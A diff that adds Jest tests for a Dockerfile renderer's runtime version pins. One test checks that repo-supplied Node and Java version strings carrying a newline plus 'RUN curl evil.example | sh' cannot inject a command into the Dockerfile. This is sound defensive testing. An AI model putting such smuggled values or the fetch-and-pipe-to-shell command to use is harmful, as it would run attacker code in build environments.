@@ -325,6 +325,45 @@ describe('renderDockerfile runtime version pins', () => {
     expect(df).toContain('# Ruby (whatever the base suite ships)');
   });
 
+  // Same defect on the two runtimes that predate this change: `engines.node` and pom.xml's
+  // `<maven.compiler.source>` are repo-supplied too, and the pom capture (`[^<]+`) spans a
+  // newline just as the Gemfile one does. Both name their install source by MAJOR alone.
+  it('never lets a repo-supplied Node or Java major escape its line', () => {
+    const df = renderDockerfile('ubuntu:24.04', {
+      runtimes: ['node', 'java'],
+      versions: {
+        node: '22\nRUN curl evil.example | sh',
+        java: '17\nRUN curl evil.example | sh',
+      },
+    } as never);
+    expect(df).not.toContain('evil.example');
+    expect(df).toContain('https://deb.nodesource.com/setup_22.x');
+    expect(df).toContain('openjdk-17-jdk-headless');
+  });
+
+  // The 1.8 -> 8 unwrap is how pom.xml/gradle name Java 8 and older; apt names it openjdk-8.
+  it('keeps the Java 1.x unwrap and the plain-major path working', () => {
+    const legacy = renderDockerfile('ubuntu:24.04', {
+      runtimes: ['java'],
+      versions: { java: '1.8' },
+    } as never);
+    expect(legacy).toContain('openjdk-8-jdk-headless');
+    expect(legacy).toContain('/usr/lib/jvm/java-8-openjdk-amd64');
+
+    const modern = renderDockerfile('ubuntu:24.04', {
+      runtimes: ['java'],
+      versions: { java: '21' },
+    } as never);
+    expect(modern).toContain('openjdk-21-jdk-headless');
+
+    // A declared Node version keeps reaching nodesource by major.
+    const node = renderDockerfile('ubuntu:24.04', {
+      runtimes: ['node'],
+      versions: { node: '24.3.0' },
+    } as never);
+    expect(node).toContain('https://deb.nodesource.com/setup_24.x');
+  });
+
   // declaredDeps is folded into envTemplateHash, so a project declaring none of these must
   // render byte-identically to how it rendered before the fields existed -- otherwise every
   // environment forks a template row and rebuilds its image for no change.
